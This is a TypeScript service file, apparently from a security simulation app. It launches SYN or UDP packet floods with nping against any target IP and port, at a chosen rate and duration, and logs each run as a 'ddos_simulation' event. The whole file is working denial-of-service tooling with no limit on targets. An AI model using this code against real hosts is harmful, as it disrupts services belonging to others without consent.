// src/services/ddosService.ts
import { spawn, ChildProcessWithoutNullStreams } from 'child_process'
import { insertEvent } from '../models/eventModel'

let ddosProcess: ChildProcessWithoutNullStreams | null = null
let currentParams: DDoSAttackParams | null = null
let startTime: number | null = null

export interface DDoSAttackParams {
    targetIP: string
    port: number
    method: 'TCP' | 'UDP'
    threads: number // packets per second
    duration: number  // duration in seconds
}

export async function startDDoSAttack(params: DDoSAttackParams): Promise<boolean> {
    if (ddosProcess) stopDDoSAttack()
    currentParams = params
    startTime = Date.now()

    await insertEvent({
        type: 'ddos_simulation',
        source_ip: 'localhost',
        dest_ip: params.targetIP,
        severity: 'medium',
    })

    // path to nping executable without extra shell quoting
    const npingPath = `C:\\Program Files (x86)\\Nmap\\nping.exe`
    const args: string[] = []

    // choose probe mode
    args.push(params.method === 'UDP' ? '--udp' : '--tcp', '--flags', 'SYN')

    // set destination port
    args.push('-p', String(params.port))

    // set rate/threads
    args.push('--rate', String(params.threads))

    // compute total count = rate * duration (remove '-c' for indefinite)
    if (params.duration > 0) {
        const totalCount = params.threads * params.duration
        args.push('-c', String(totalCount))
    }

    // target host
    args.push(params.targetIP)

    // spawn nping directly (no shell), so kill() works correctly
    const proc = spawn(npingPath, args)
    ddosProcess = proc

    proc.stdout.on('data', data => console.log(data.toString()))
    proc.stderr.on('data', data => console.error(data.toString()))

    // cleanup on exit
    proc.on('exit', () => {
        ddosProcess = null
        currentParams = null
        startTime = null
        console.log('ddos simulation exited')
    })

    return true
}

export function stopDDoSAttack(): void {
    if (ddosProcess) {
        // default kill sends SIGTERM, sufficient for nping
        ddosProcess.kill()
    }
}

export function getDDoSStatus() {
    const active = ddosProcess !== null
    const uptimeSeconds = active && startTime ? Math.floor((Date.now() - startTime) / 1000) : 0

    return {
        active,
        params: currentParams,
        pid: ddosProcess?.pid,
        spawnArgs: ddosProcess?.spawnargs,
        startTime: startTime ? new Date(startTime).toISOString() : null,
        uptimeSeconds,
    }
}
